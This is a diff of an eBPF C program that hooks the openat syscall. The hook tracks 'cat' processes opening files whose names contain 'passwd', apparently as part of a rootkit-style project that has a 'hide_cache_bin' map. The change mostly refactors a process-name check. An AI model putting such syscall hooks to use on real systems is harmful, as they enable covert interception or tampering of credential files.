@@ -1,5 +1,5 @@
 /**
- * Hooking open & openat for storing fd of potiential target files.
+ * Hooking openat for storing fd of potiential target files.
  * 
  * NOTE : I'm making a check also only on "cat" binary since it's the only one i'm focuing for openat & read.
  * The main problem for the current stands in the hide_cache_bin map containing bins such as 'bash' making a lot of requests...
@@ -30,8 +30,6 @@
 #include "../data/bpf_ringbuf.h"
 #include "../lib/ftlib.h"
 
-#define TARGET_BIN "cat"
-
 /**
  * Hook sys_entry_openat
  * 
@@ -45,14 +43,7 @@ int tp_sys_enter_openat(struct sys_enter_openat_ctx *ctx)
     if(!ctx->filename)
         return 0;
 
-    if(!__is_target_bin())
-        return 0;
-
-    char comm[TASK_COMM_LEN] = {0};
-    bpf_get_current_comm(comm, sizeof(comm));
-    
-    //32 overkill but ok.
-    if(ft_strcmp(comm, TARGET_BIN, 32) != 0)
+    if(!__is_target_bin() || !__is_binary_cat())
         return 0;
 
     char filename[MAX_PATH] = {0};
@@ -63,7 +54,7 @@ int tp_sys_enter_openat(struct sys_enter_openat_ctx *ctx)
     if(ft_strstr(filename, "passwd") == NULL)
         return 0;
 
-    PRINT_DEBUG("Filename for open : %s from caller : %s", filename, comm);
+    PRINT_DEBUG("Filename for open : %s from cat command", filename);
     //[DBG][tp_sys_enter_openat] Filename for open : /etc/passwd from caller : cat
 
     __u64 key = bpf_get_current_pid_tgid(); //64 bits value returned.
